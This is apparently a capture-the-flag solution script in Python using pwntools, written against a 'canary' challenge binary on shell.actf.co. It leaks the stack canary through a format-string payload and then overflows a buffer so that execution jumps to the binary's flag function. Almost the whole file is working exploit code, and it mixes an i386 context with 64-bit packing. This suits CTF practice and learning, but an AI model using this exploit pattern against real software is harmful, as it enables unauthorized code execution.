from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./canary"
HOST = "shell.actf.co"
PORT = 20701 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_flag = elf.symbols["flag"]
#libc = ELF('./')
#
#main_addr = elf.symbols["main"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

def exploit():
	bufsize = 0x40 
	off_canary = 0x8
	
	payload = "%17$p"	
	
	conn.sendlineafter("name? ", payload)	
	conn.recvuntil(", ")
	canary = int(conn.recvuntil("!")[:-1], 16)
	
	payload = "A"*(bufsize - off_canary)
	payload += p64(canary)
	payload += "A"*8
	payload += p64(addr_flag)
	conn.sendlineafter("me?", payload)

	conn.interactive()	

if __name__ == "__main__":
	exploit()	
